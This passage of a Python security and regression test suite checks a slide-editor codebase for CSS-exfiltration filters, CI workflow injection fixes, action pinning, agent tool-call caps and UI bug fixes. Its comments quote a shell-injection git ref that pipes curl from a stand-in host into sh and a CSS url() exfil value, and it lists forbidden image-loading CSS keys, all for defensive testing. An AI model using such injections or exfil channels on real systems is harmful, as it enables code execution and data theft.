    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()

    # (1) one canonical filter — no duplicate reject regex that could drift.
    if "CSS_LOAD_REJECT" not in imports:
        ok("single canonical CSS reject filter (no duplicate CSS_LOAD_REJECT)")
    else:
        fail("duplicate CSS reject regex", "fold CSS_LOAD_REJECT into STYLE_VALUE_REJECT")

    # (2) STYLE_VALUE_REJECT is function-name-agnostic (catches image()/cross-fade()/
    #     src(), not just image-set()) — the v12.59 bypass class, on this surface too.
    # STYLE_VALUE_REJECT is composed (a regex literal + CSS_FETCH_SCHEME.source),
    # so match the whole definition line rather than a bare /…/ literal.
    _rejm = re.search(r'const STYLE_VALUE_REJECT = (.+);', imports)
    rej = _rejm
    if rej and "CSS_FETCH_SCHEME" in rej.group(1) and re.search(r'const CSS_FETCH_SCHEME = /', imports):
        ok("STYLE_VALUE_REJECT reuses CSS_FETCH_SCHEME (one scheme pattern, both CSS surfaces)")
    else:
        fail("STYLE_VALUE_REJECT scheme reuse",
             "must append CSS_FETCH_SCHEME.source so a slashless authority is rejected here too")
    if rej and "[a-z]" in rej.group(1) and "['\"]" in rej.group(1):
        ok("STYLE_VALUE_REJECT rejects any string-source CSS function (name-agnostic)")
    else:
        fail("STYLE_VALUE_REJECT name-agnostic", "must reject `funcname('...')`, not only image-set(")

    # (2b) v12.66: both CSS value filters reject the CSS-comment token-splitting
    #      primitive (`funcname(/**/"…")` / `url/**/(…)`). CSS allows a comment —
    #      not just whitespace — between a function name and its '('/quoted arg, so
    #      without this a string-source URL slips past the fnStr/`://` checks. The
    #      behavioral round-trip (test_css_exfil.cjs §5/§7) executes the predicate.
    if rej and r"\/\*" in rej.group(1):
        ok("STYLE_VALUE_REJECT rejects CSS comments (token-splitting exfil)")
    else:
        fail("STYLE_VALUE_REJECT comment reject", r"must include \/\* so `image-set(/**/\"…\")` can't split the token")
    if re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("/\*"\)\s*!==\s*-1\s*\)\s*return\s+false', imports):
        ok("isSvgStyleSafe rejects CSS comments (token-splitting exfil)")
    else:
        fail("isSvgStyleSafe comment reject", 'must reject css.indexOf("/*") so the SVG <style> surface matches')

    # (3) scrubColorFields exists and is wired into both sanitize entry points.
    if "function scrubColorFields(" in imports:
        ok("scrubColorFields helper defined")
    else:
        fail("scrubColorFields missing", "color scalars need a shared scrub helper")
    sslide = imports[imports.index("function sanitizeSlide("):imports.index("function sanitizeItem(")] if "function sanitizeSlide(" in imports else ""
    if "scrubColorFields(clean)" in sslide:
        ok("sanitizeSlide scrubs slide color scalars (bg/bgGradient/color/accent)")
    else:
        fail("sanitizeSlide color scrub", "slide bg/bgGradient/color must be scrubbed")
    sblock = imports[imports.index("function sanitizeBlock("):imports.index("const VALID_COMMENT_STATUSES")] if "function sanitizeBlock(" in imports else ""
    # Block scalars scrubbed directly; sub-objects (items/cells/quadrants/nested
    # points) are hardened recursively via scrubSubObject.
    if "scrubColorFields(clean)" in sblock and "scrubSubObject(clean.items)" in sblock:
        ok("sanitizeBlock scrubs block + item/cell color scalars (recursive scrubSubObject)")
    else:
        fail("sanitizeBlock color scrub", "block + items (grid cell.bg/dotColor/…) must be scrubbed")

    # (4) slide bgImage (a background *image*) clamped to inline data:image/* — no network.
    if 'sanitizeUrl(clean.bgImage, ["data:"])' in imports and 'clean.bgImage = s' in imports \
       and 'data:image' in sslide:
        ok("slide bgImage restricted to inline data:image/* (no network)")
    else:
        fail("bgImage data:image-only", "bgImage must clamp to data:image/* like the image block")

    # (5) branding color scalars routed through the scrub (sanitizeString alone passes a short url()).
    if 'scrubColorFields(importedBranding)' in imports:
        ok("branding accentColor/footerBg/footerColor scrubbed")
    else:
        fail("branding color scrub", "footerBg/accentColor pass a short url() through sanitizeString")

    # (5b) v12.67: the in-app write paths that bypass import sanitization must sanitize too.
    #      SET_BRANDING scrubs branding color scalars. The slide-mutating actions
    #      (UPDATE_SLIDE patch merge, ADD_SLIDE, INSERT_SLIDE, SET_SLIDES) run the full
    #      sanitizeSlide — a color-only scrub would miss style objects, bgImage, and image
    #      src; the new-slide / startup-patch paths were otherwise uncovered.
    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
    setb = reducer[reducer.index('case "SET_BRANDING"'):reducer.index('case "SET_GUIDELINES"')] if 'case "SET_BRANDING"' in reducer else ""
    # scrubSubObject supersedes scrubColorFields here (v13.46): branding is a raw
    # spread that keeps arbitrary KEYS, so it needs the `_`/`--` namespace drops and
    # the paint/layout scrubbers too, not just colour-value scrubbing.
    if "scrubSubObject(b)" in setb:
        ok("SET_BRANDING scrubs the merged branding via the canonical sub-object scrubber")
    else:
        fail("SET_BRANDING scrub", "branding dispatch must run scrubSubObject on the merged object")
    # Each slide-mutating action must funnel its incoming slide(s) through sanitizeSlide
    # (covers style objects + bgImage data: clamp + image src + svg markup + color scrub).
    for action, end in [('case "SET_SLIDES"', 'case "ADD_SLIDE"'),
                        ('case "ADD_SLIDE"', 'case "INSERT_SLIDE"'),
                        ('case "INSERT_SLIDE"', 'case "UPDATE_SLIDE"'),
                        ('case "UPDATE_SLIDE"', 'case "REMOVE_SLIDE"')]:
        seg = reducer[reducer.index(action):reducer.index(end)] if action in reducer and end in reducer else ""
        name = action.split('"')[1]
        if "sanitizeSlide" in seg:  # called directly or passed as a .map callback
            ok(f"{name} sanitizes incoming slide(s) via sanitizeSlide (full render-sink coverage)")
        else:
            fail(f"{name} sanitize", f"{name} must route incoming slide(s) through sanitizeSlide")

    # (5c) v12.67: dormant item-insert actions that carry a slides payload must sanitize it,
    #      so a future caller can't reintroduce the channel; IMPORT_CONCEPTS already did.
    for action, end in [('case "ADD_ITEM"', 'case "IMPORT_CONCEPTS"'),
                        ('case "BATCH_ADD"', 'case "REMOVE_ITEM"')]:
        seg = reducer[reducer.index(action):reducer.index(end)] if action in reducer and end in reducer else ""
        name = action.split('"')[1]
        if "sanitizeSlide" in seg:
            ok(f"{name} sanitizes its slides payload (dormant-path defense-in-depth)")
        else:
            fail(f"{name} slides sanitize", f"{name} must map its slides payload through sanitizeSlide")

    # (5d) v12.67: the local live-sync LOAD must take branding from the sanitized copy,
    #      not the raw incoming deck (slide content was already sanitized; branding was missed).
    appjs = open(os.path.join(PARTS_DIR, "part-app.jsx"), encoding="utf-8").read()
    if "...sanitized.branding" in appjs and "...deck.branding }" not in appjs:
        ok("local live-sync LOAD uses sanitized.branding (not raw deck.branding)")
    else:
        fail("local-sync branding", "live-sync payload must spread sanitized.branding, not raw deck.branding")

    # (6) behavioral round-trip — runs the real extracted predicate against PoC values.
    css_script = os.path.join(REPO_ROOT, "tests", "test_css_exfil.cjs")
    if os.path.exists(css_script):
        try:
            r = subprocess.run(["node", css_script], capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                ok(f"CSS exfil behavioral round-trip ({m.group(1) if m else '?'} checks)")
            else:
                fail("CSS exfil behavioral round-trip",
                     f"node tests/test_css_exfil.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("CSS exfil behavioral round-trip", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("CSS exfil behavioral round-trip", "timeout after 60s")
    else:
        fail("CSS exfil behavioral round-trip", f"missing: {css_script}")


# ━━━ Audit 2025-05 hardening fixes (CRITICAL/HIGH from security audit) ━
# Covers: shell-injection in release-preview workflow (C1), github-script
# JS-injection via test stdout (C2), LOAD_LANES sanitization (H1),
# block.style CSS-key allowlist (H2), ReAct loop caps (H5).

def test_audit_2025_05_fixes():
    print("\n── Audit 2025-05 Hardening Fixes ──")
    workflows = os.path.join(REPO_ROOT, ".github", "workflows")
    rp_path = os.path.join(workflows, "release-preview.yml")
    ci_path = os.path.join(workflows, "ci.yml")
    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    engine  = open(os.path.join(PARTS_DIR, "part-engine.jsx"), encoding="utf-8").read()

    # ── C1: release-preview.yml must not interpolate inputs.pr_ref into a
    #        `run:` shell command. The branch name is attacker-controlled
    #        (`feat$(curl evil|sh)` is a valid git ref) and the job holds
    #        id-token: write + attestations: write.
    if os.path.exists(rp_path):
        rp_lines = open(rp_path, encoding="utf-8").read().splitlines()
        # Walk: when we see `run: |`, record its indent; the block ends at
        # the next non-blank line with indent <= the run's. Inside the
        # block, any `${{ inputs.pr_ref }}` is shell injection.
        in_run = False
        run_indent = -1
        offenders = []
        for line in rp_lines:
            indent = len(line) - len(line.lstrip())
            if in_run:
                if line.strip() and indent <= run_indent:
                    in_run = False
                elif "${{ inputs.pr_ref }}" in line or "${{inputs.pr_ref}}" in line:
                    offenders.append(line.strip())
            if not in_run and re.match(r'^\s*run:\s*\|\s*$', line):
                in_run = True
                run_indent = indent
        if offenders:
            fail("C1 release-preview.yml shell-injection",
                 f"{len(offenders)} run-block uses of inputs.pr_ref — use env: + \"$PR_REF\"")
        else:
            ok("C1 release-preview.yml does not shell-interpolate inputs.pr_ref")
    else:
        fail("C1 release-preview.yml not found", rp_path)

    # ── C2: ci.yml must not interpolate step outputs into github-script JS
    #        via `${{ steps.X.outputs.output }}` inside JS template-literals.
    #        Test stdout is attacker-controlled (PR can add fixtures whose
    #        names contain backticks). Use env: + process.env instead.
    if os.path.exists(ci_path):
        ci_lines = open(ci_path, encoding="utf-8").read().splitlines()
        # The unsafe pattern is `${{ steps.X.outputs.output }}` interpolated
        # inside a github-script body (the `script: |` block) — that inlines
        # attacker-controlled stdout into the JS source. The same expression
        # inside an `env:` mapping is safe (it becomes process.env.X at
        # runtime). Walk and only flag occurrences inside a `script: |` block.
        in_script = False
        script_indent = -1
        offenders = []
        for line in ci_lines:
            indent = len(line) - len(line.lstrip())
            if in_script:
                if line.strip() and indent <= script_indent:
                    in_script = False
                elif re.search(r'\$\{\{\s*steps\.\w+\.outputs\.output\s*\}\}', line):
                    offenders.append(line.strip())
            if not in_script and re.match(r'^\s*script:\s*\|\s*$', line):
                in_script = True
                script_indent = indent
        if offenders:
            fail("C2 ci.yml github-script test-output interpolation",
                 f"{len(offenders)} script-block uses of steps.*.outputs.output — use env: mapping")
        else:
            ok("C2 ci.yml does not interpolate step stdout into github-script JS")
    else:
        fail("C2 ci.yml not found", ci_path)

    # ── H1: LOAD_LANES reducer case must sanitize lanes — Vera ReAct tool
    #        writes (`set_slides`, `add_slide`, `edit_slide`) round-trip
    #        through LOAD_LANES, the only ingest path that previously skipped
    #        sanitizeSlide.
    # Extract LOAD_LANES case body (handles both one-line and multi-line forms).
    m = re.search(r'case "LOAD_LANES":\s*(.+?)(?=\n\s*case "|\n\s*default:)', reducer, re.DOTALL)
    if m and "sanitizeSlide" in m.group(1):
        ok("H1 LOAD_LANES reducer routes lanes through sanitizeSlide")
    else:
        fail("H1 LOAD_LANES sanitization",
             "LOAD_LANES must map lanes→items→slides through sanitizeSlide")

    # ── H2: sanitizeBlock must allowlist CSS keys in block.style — the
    #        previous typecheck-only guard permitted `backgroundImage:
    #        url(https://attacker/?d=...)` as a zero-click exfil channel.
    if "SAFE_STYLE_KEYS" in imports:
        ok("H2 SAFE_STYLE_KEYS allowlist defined")
    else:
        fail("H2 SAFE_STYLE_KEYS allowlist missing",
             "block.style must be filtered through an allowlist of safe CSS keys")
    if "sanitizeStyle" in imports:
        ok("H2 sanitizeStyle helper defined")
    else:
        fail("H2 sanitizeStyle helper missing")
    # Dangerous CSS values (url(), expression(), <, javascript:) must be
    # rejected even when the key is allowlisted (e.g. a future addition
    # could expose content: which accepts url()). Assert the real mechanism
    # — the STYLE_VALUE_REJECT regex and its use in the style sanitizer —
    # rather than proximity to prose, so changelog wording can't affect it.
    reject_def = re.search(r'const STYLE_VALUE_REJECT = (.+);', imports)
    if reject_def and 'url' in reject_def.group(1) and 'STYLE_VALUE_REJECT.test(' in imports:
        ok("H2 sanitizeStyle rejects values containing url( (via STYLE_VALUE_REJECT)")
    else:
        fail("H2 sanitizeStyle url() guard",
             "must reject any value containing url( to prevent CSS exfil")
    # Image-loading CSS keys (background-image et al.) must NOT be in the
    # allowlist — they are the primary exfil vector.
    m = re.search(r'SAFE_STYLE_KEYS\s*=\s*new Set\(\[([^\]]+)\]', imports)
    if m:
        # Parse out individually quoted entries so we match whole keys, not
        # substrings (avoids "justifyContent" matching the substring "content").
        keys = set(re.findall(r'"([^"]+)"', m.group(1)))
        keys_lower = {k.lower() for k in keys}
        forbidden = {"backgroundimage", "background", "borderimage",
                     "liststyleimage", "liststyle", "cursor", "content",
                     "mask", "webkitmask", "filter", "font", "src",
                     "clippath"}
        leaked = sorted(forbidden & keys_lower)
        if not leaked:
            ok("H2 SAFE_STYLE_KEYS excludes image-loading keys")
        else:
            fail("H2 SAFE_STYLE_KEYS leaks exfil keys", f"contains: {leaked}")
    # And the block-level style filter must invoke sanitizeStyle, not just
    # typecheck. Either pattern is fine: direct assignment from sanitizeStyle,
    # or `const s = sanitizeStyle(clean.style)` followed by `clean.style = s`.
    if re.search(r'sanitizeStyle\(\s*clean\.style\s*\)', imports):
        ok("H2 sanitizeBlock routes clean.style through sanitizeStyle")
    else:
        fail("H2 sanitizeBlock style routing",
             "clean.style must pass through sanitizeStyle()")

    # ── H5: ReAct loop must cap tool-calls per turn and total messages size
    #        to prevent cost-amplification DoS. Previously only iteration
    #        count (12) was capped; tool_calls per iter was unbounded.
    if "MAX_TOOLS_PER_TURN" in engine:
        ok("H5 MAX_TOOLS_PER_TURN cap defined")
    else:
        fail("H5 MAX_TOOLS_PER_TURN missing",
             "ReAct loop needs a per-turn tool-call cap")
    if "MAX_TOTAL_TOOLS" in engine:
        ok("H5 MAX_TOTAL_TOOLS cap defined")
    else:
        fail("H5 MAX_TOTAL_TOOLS missing",
             "ReAct loop needs a session-total tool-call cap")
    if "MAX_MESSAGES_BYTES" in engine:
        ok("H5 MAX_MESSAGES_BYTES cap defined")
    else:
        fail("H5 MAX_MESSAGES_BYTES missing",
             "ReAct loop needs a messages-size cap")
    # The caps must actually be enforced inside the for-loop, not just
    # declared.
    loop_match = re.search(r'for \(let iter = 0; iter < 12;[\s\S]+?\n\s{4}\}\n', engine)
    loop_body = loop_match.group(0) if loop_match else ""
    if "MAX_TOOLS_PER_TURN" in loop_body and "MAX_TOTAL_TOOLS" in loop_body and "MAX_MESSAGES_BYTES" in loop_body:
        ok("H5 ReAct loop body enforces all three caps")
    else:
        fail("H5 ReAct loop enforcement",
             "MAX_TOOLS_PER_TURN / MAX_TOTAL_TOOLS / MAX_MESSAGES_BYTES must be checked inside the for loop")

    # ── H7: every third-party action must be pinned to a commit SHA. Tag
    #        pins (@v4, @v7 etc.) are mutable — if the action's publisher
    #        account is compromised, attacker can re-point the tag and
    #        backdoor every CI run. Recent precedents: tj-actions/changed-files
    #        and reviewdog/action-setup (March 2025). Release-pipeline blast
    #        radius for us = forged SLSA attestations on signed skill ZIPs.
    wf_dir = os.path.join(REPO_ROOT, ".github", "workflows")
    if os.path.isdir(wf_dir):
        offenders = []
        for fn in sorted(os.listdir(wf_dir)):
            if not fn.endswith(".yml"):
                continue
            path = os.path.join(wf_dir, fn)
            for i, line in enumerate(open(path, encoding="utf-8").read().splitlines(), 1):
                m = re.search(r'uses:\s*([\w./_-]+)@([^\s#]+)', line)
                if not m:
                    continue
                action, ref = m.group(1), m.group(2)
                # Reusable local workflows (./.github/workflows/*.yml) don't have @ref.
                if action.startswith("./"):
                    continue
                # SHA pin = 40 lowercase hex chars.
                if not re.fullmatch(r'[a-f0-9]{40}', ref):
                    offenders.append(f"{fn}:{i} {action}@{ref}")
        if offenders:
            fail("H7 actions pinned by mutable tag",
                 f"{len(offenders)} action(s) pinned to non-SHA refs: " + "; ".join(offenders[:5]) +
                 (f" (+{len(offenders)-5} more)" if len(offenders) > 5 else ""))
        else:
            ok("H7 all workflow actions pinned to 40-char SHAs")
    else:
        fail("H7 workflows dir not found", wf_dir)


# ━━━ Known Bugs (regression watchlist) ━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_known_bugs():
    print("\n── Known Bug Tests ──")

    # part-slides.jsx was split (SlidePanel now lives in part-slidepanel.jsx);
    # these checks span both, so concatenate in build order to search across them.
    slides_jsx = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-slides.jsx", "part-slidepanel.jsx")
    )
    engine_jsx = open(os.path.join(PARTS_DIR, "part-engine.jsx"), encoding="utf-8").read()
    imports_jsx = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    chat_jsx = open(os.path.join(PARTS_DIR, "part-chat.jsx"), encoding="utf-8").read()

    # BUG 1: Scroll wheel should use presSlides in fullscreen, not slides
    # The keyboard handler correctly does: const navSlides = fullscreen ? presSlides : slides
    # The scroll useEffect body should also reference presSlides or navSlides for fullscreen compat.
    # Find the scroll handler body (between SCROLL_THRESHOLD and its closing dep array)
    scroll_match = re.search(r'SCROLL_THRESHOLD.*?if \(dir > 0\)\s*\{(.*?)\} else \{', slides_jsx, re.DOTALL)
    if scroll_match:
        scroll_body = scroll_match.group(1)
        if "presSlides" in scroll_body or "navSlides" in scroll_body:
            ok("Scroll wheel uses presSlides in fullscreen")
        else:
            fail("BUG: Scroll wheel uses slides.length not presSlides in fullscreen (known)")
    else:
        fail("Scroll wheel test", "could not locate scroll handler body")

    # BUG 2: Quick edit / new slide popups should be responsive, not fixed 320px
    # Look for showQuickEdit lines with width: 320 (hardcoded, no isMobile conditional)
    quick_edit_lines = [l for l in slides_jsx.split("\n") if "showQuickEdit" in l and "width:" in l]
    has_fixed = any("width: 320" in l and "isMobile" not in l for l in quick_edit_lines)
    if not has_fixed:
        ok("Quick edit popup uses responsive width")
    else:
        fail("BUG: Quick edit popup hardcodes width:320, overflows on small mobile (known)")

    # BUG 3: _system undo markers should be excluded from persistent storage
    if "_system" in imports_jsx and "extractSave" in imports_jsx:
        # Check if extractSave filters _system messages
        extract_section = imports_jsx[imports_jsx.index("extractSave"):][:500]
        if "_system" in extract_section or "filter" in extract_section:
            ok("extractSave filters _system chat messages")
        else:
            fail("BUG: extractSave doesn't filter _system undo markers from storage (known)")
    else:
        fail("BUG: extractSave doesn't filter _system undo markers from storage (known)")

    # BUG 4: edit_slide smart merge should deep-merge grid items, not replace
    edit_slide_section = ""
    in_edit = False
    for line in engine_jsx.split("\n"):
        if 'case "edit_slide"' in line:
            in_edit = True
        if in_edit:
            edit_slide_section += line + "\n"
        if in_edit and line.strip().startswith("case ") and "edit_slide" not in line:
            break
    if "grid" in edit_slide_section or "deep" in edit_slide_section.lower() or "items" in edit_slide_section:
        ok("edit_slide handles grid block merging")
    else:
        fail("BUG: edit_slide smart merge loses nested grid cell content (known)")

    # BUG 5: Fullscreen should handle browser back button (popstate)
    if "popstate" in slides_jsx or "history.pushState" in slides_jsx:
        ok("Fullscreen handles browser back button via popstate")
    else:
        fail("BUG: No browser back button handling in fullscreen — exits artifact (known)")

    # BUG 6: onClick={send} should be onClick={() => send()} to prevent event leak
    if "onClick={send}" in chat_jsx:
        fail("BUG: onClick={send} passes MouseEvent as directMsg (known)")
    else:
        ok("Chat send button uses arrow wrapper, no event leak")


# ━━━ Editor UX Bug Tests (CR1–CR3) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_editor_ux_bugs():
    print("\n── Editor UX Bug Tests (CR1–CR3) ──")

    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
    blocks  = open(os.path.join(PARTS_DIR, "part-blocks.jsx"), encoding="utf-8").read()
    # part-slides.jsx was split (SlidePanel now lives in part-slidepanel.jsx);
    # CR3 checks span both, so concatenate in build order to search across them.
    slides  = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-slides.jsx", "part-slidepanel.jsx")
    )

    # ── CR1: opening a deck must default to the first slide of the first
    #        non-empty module in EDITOR mode too — not only presentation mode.
    load_case = reducer[reducer.index('case "LOAD"'):reducer.index('case "ADD_LANE"')]
    if "VELA_PRESENTATION_MODE && !loaded.selectedId" in load_case:
        fail("CR1: LOAD auto-select is gated on VELA_PRESENTATION_MODE — editor opens blank")
    else:
        ok("CR1: LOAD auto-select not gated solely on presentation mode")
    # Robust intent check (not a literal code string): the LOAD path must pick the
    # first module that actually HAS slides and assign it as the selection — whether
    # the trigger is "no selection" or a stale selectedId that resolves to an empty
    # module (the deck-switch case). Match the semantic tokens, not one exact guard.
    if re.search(r'i\.slides\.length\s*>\s*0', load_case) and re.search(r'selectedId\s*=\s*it\.id', load_case):
        ok("CR1: LOAD defaults to first module WITH slides regardless of mode")
    else:
        fail("CR1: LOAD does not default-select first non-empty module in editor")

    # ── CR2: a centered heading must stay centered in the editor path too.
    #        The editor forces an icon-slot flex row (headingIconSlot) whose
    #        text child is flex:1 — without an explicit textAlign the centered
    #        text collapses to the left. Presenter (no icon slot) keeps it
    #        centered via hs.textAlign. The fix carries textAlign onto the
    #        flex-child so both modes align identically.
    heading_case = blocks[blocks.index('case "heading"'):blocks.index('case "text":')]
    if "textAlign: block.align" in heading_case:
        ok("CR2: heading icon-slot path preserves textAlign (centered in editor + presenter)")
    else:
        fail("CR2: heading centering dropped in editor icon-slot path (flex:1 child, no textAlign)")

    # ── CR3: editor slide viewport must be a fixed 16:9 box and the slide
    #        toolbar must not shift per-slide. The old default rendered the
    #        auto ratio with mode="fill" (container-shaped, elastic) and the
    #        notes bar auto-expanded per slide, pushing the toolbar around.
    if 'mode={isAuto ? "fill" : "fit-viewport"}' in slides:
        fail("CR3: editor uses elastic container-shaped 'fill' viewport (not fixed 16:9)")
    else:
        ok("CR3: editor viewport pinned to fixed-aspect (letterboxed) render")
    if '"slide-viewport"' in slides:
        ok("CR3: editor slide viewport is tagged (fixed-aspect box)")
    else:
        fail("CR3: no slide-viewport marker on editor preview box")
    if 'data-testid="slide-toolbar"' in slides:
        ok("CR3: slide toolbar is tagged for stable-position verification")
    else:
        fail("CR3: slide toolbar has no test marker")
    if "const notesOpen = showNotes || hasNotes" in slides:
        fail("CR3: notes bar auto-expands per slide — toolbar position varies")
    else:
        ok("CR3: notes bar does not auto-expand per slide (stable toolbar)")


def test_slide_editor_ux_features():
    print("\n── Multi-select / Context-menu / Move-picker (Features 4–6) ──")

    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
    # part-slides.jsx was split (SlidePanel now lives in part-slidepanel.jsx);
    # these checks span both (incl. the SectionPicker..SlidePanel slice below),
    # so concatenate in build order to search across them.
    slides  = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-slides.jsx", "part-slidepanel.jsx")
    )
    lst     = open(os.path.join(PARTS_DIR, "part-list.jsx"), encoding="utf-8").read()
    # part-app.jsx was split (modal/dialog components now live in
    # part-app-modals.jsx, incl. ShortcutHelp's help text checked below);
    # concatenate in build order to search across both.
    appjs   = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-app-modals.jsx", "part-app.jsx")
    )

    # ── Feature 4: multi-slide clipboard ────────────────────────────
    if "velaClipboardWriteSlides" in imports and "velaClipboardReadSlides" in imports:
        ok("F4: multi-slide clipboard helpers exist (write/read Slides)")
    else:
        fail("F4: velaClipboardWriteSlides/ReadSlides missing")
    read_fn = imports[imports.index("const velaClipboardReadSlides"):]
    read_fn = read_fn[:read_fn.index("};") + 2]
    if "_velaSlides" in read_fn and "_velaSlide" in read_fn:
        ok("F4: read path accepts BOTH multi (_velaSlides) and legacy single (_velaSlide) envelopes")
    else:
        fail("F4: read path not back-compatible with legacy single envelope")
    write_fn = imports[imports.index("const velaClipboardWriteSlides"):]
    write_fn = write_fn[:write_fn.index("};") + 2]
    if "_velaSlide:" in write_fn and "_velaSlides:" in write_fn:
        ok("F4: single-slide copy still writes legacy envelope (older readers can paste)")
    else:
        fail("F4: single-slide copy does not preserve legacy envelope")
    if "velaClipboardWriteSlides" in slides and "state.selectedSlideIndices" in slides:
        ok("F4: Ctrl+C copies all selected slides (uses selectedSlideIndices)")
    else:
        fail("F4: copy handler does not use multi-selection")
    if "velaClipboardReadSlides" in slides and 'type: "INSERT_SLIDES"' in slides and "slides: arr" in slides:
        ok("F4: Ctrl+V inserts pasted slides in one batch (single undo)")
    else:
        fail("F4: paste handler does not batch-insert pasted slides")

    # ── Feature 4: reducer multi-select state ───────────────────────
    if "selectedSlideIndices" in reducer and 'case "SET_SLIDE_SELECTION"' in reducer:
        ok("F4: reducer has selectedSlideIndices + SET_SLIDE_SELECTION action")
    else:
        fail("F4: reducer missing multi-select state/action")
    if '"SET_SLIDE_SELECTION"' in reducer[reducer.index("NO_HISTORY"):reducer.index("MAX_HISTORY")]:
        ok("F4: SET_SLIDE_SELECTION excluded from undo history")
    else:
        fail("F4: SET_SLIDE_SELECTION not in NO_HISTORY")
    sel_case = reducer[reducer.index('case "SELECT"'):reducer.index('case "SET_FULLSCREEN"')]
    if "selectedSlideIndices: []" in sel_case:
        ok("F4: SELECT / SET_SLIDE_INDEX clear multi-selection")
    else:
        fail("F4: plain selection does not clear multi-selection")
    if "handleSlideRowClick" in lst and "e.shiftKey" in lst and "e.metaKey || e.ctrlKey" in lst:
        ok("F4: TOC slide rows support shift-range + cmd/ctrl-toggle select")
    else:
        fail("F4: TOC slide rows missing multi-select click logic")
    if 'data-selected={isMultiSel ? "true" : undefined}' in lst:
        ok("F4: selected rows carry data-selected marker + highlight")
    else:
        fail("F4: no data-selected marker on selected rows")

    # ── Feature 5: right-click context menu ─────────────────────────
    if "function ContextMenu(" in lst and 'testid="toc-context-menu"' in lst:
        ok("F5: reusable ContextMenu component exists (toc-context-menu)")
    else:
        fail("F5: ContextMenu component / testid missing")
    if "onContextMenu=" in lst:
        ok("F5: TOC slide row wires onContextMenu")
    else:
        fail("F5: onContextMenu not attached to slide rows")
    for tid in ["ctx-move", "ctx-duplicate", "ctx-delete", "ctx-hide"]:
        if f'testid="{tid}"' in lst:
            ok(f"F5: context menu has {tid} action")
        else:
            fail(f"F5: context menu missing {tid}")
    for act in ["MOVE_SLIDE_TO_MODULE", "DUPLICATE_SLIDE", "REMOVE_SLIDE", "TOGGLE_SLIDE_HIDDEN"]:
        if act in lst:
            ok(f"F5: context menu dispatches {act}")
        else:
            fail(f"F5: context menu does not dispatch {act}")
    # closes on outside-click / Escape
    if 'addEventListener("mousedown"' in lst and 'e.key === "Escape"' in lst:
        ok("F5: context menu closes on outside-click and Escape")
    else:
        fail("F5: context menu missing outside-click/Escape close")

    # ── Feature 6: searchable move picker ───────────────────────────
    if "function SectionPicker(" in slides and 'data-testid="section-search"' in slides:
        ok("F6: SectionPicker has an autofocused search input (section-search)")
    else:
        fail("F6: SectionPicker search input missing")
    picker = slides[slides.index("function SectionPicker("):slides.index("function SlidePanel(")]
    if "toLowerCase().includes(ql)" in picker:
        ok("F6: search filters sections case-insensitively")
    else:
        fail("F6: search does not filter sections")
    if "vela-wide-scroll" in slides and "vela-wide-scroll::-webkit-scrollbar{width:10px}" in imports:
        ok("F6: scoped wider scrollbar class (.vela-wide-scroll) applied to picker")
    else:
        fail("F6: wide-scrollbar scoped class missing")
    if "::-webkit-scrollbar{width:5px}" in imports:
        ok("F6: global scrollbar width unchanged (5px)")
    else:
        fail("F6: global scrollbar width was altered")
    if "data-scroll-container" in picker and "onWheel={(e) => e.stopPropagation()}" in picker:
        ok("F6: picker scroll list marked data-scroll-container + stops wheel (no slide change)")
    else:
        fail("F6: wheel over picker not isolated from slide-nav")
    # move popover reuses SectionPicker
    if "<SectionPicker" in slides and 'data-testid="move-picker"' in slides:
        ok("F6: move-to-module popover renders SectionPicker")
    else:
        fail("F6: move popover does not reuse SectionPicker")

    # help text mentions multi-select
    if "Multi-select slides" in appjs:
        ok("F4/F5: help dialog documents multi-select + right-click menu")
    else:
        fail("F4/F5: help dialog not updated")


# ━━━ CR: TOC keyboard tree + collapsed marker + gallery title cards ━━━

def test_toc_nav_and_gallery_titlecards():
    print("\n── TOC keyboard tree / collapsed marker / gallery title cards ──")

    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
    # part-slides.jsx was split (SlidePanel now lives in part-slidepanel.jsx);
    # the CR2 global-handler guard check spans both, so concatenate in build
    # order to search across them (the GalleryView..TeacherMessage slice below
    # stays fully inside part-slides.jsx either way).
    slides  = "".join(
        open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
        for f in ("part-slides.jsx", "part-slidepanel.jsx")
    )
    lst     = open(os.path.join(PARTS_DIR, "part-list.jsx"), encoding="utf-8").read()
    appjs   = open(os.path.join(PARTS_DIR, "part-app.jsx"), encoding="utf-8").read()

    # ── CR2 A: collapse state lifted into the reducer ──
    if "collapsedSections: []" in reducer:
        ok("CR2: reducer init has collapsedSections view-state")
    else:
        fail("CR2: reducer init missing collapsedSections")
    if 'case "TOGGLE_SECTION_COLLAPSE"' in reducer and 'case "SET_SECTION_COLLAPSED"' in reducer:
        ok("CR2: reducer has TOGGLE_SECTION_COLLAPSE + SET_SECTION_COLLAPSED actions")
    else:
        fail("CR2: reducer missing collapse actions")
    no_hist = reducer[reducer.index("NO_HISTORY"):reducer.index("MAX_HISTORY")]
    if '"TOGGLE_SECTION_COLLAPSE"' in no_hist and '"SET_SECTION_COLLAPSED"' in no_hist:
        ok("CR2: collapse actions excluded from undo history")
    else:
        fail("CR2: collapse actions not in NO_HISTORY")
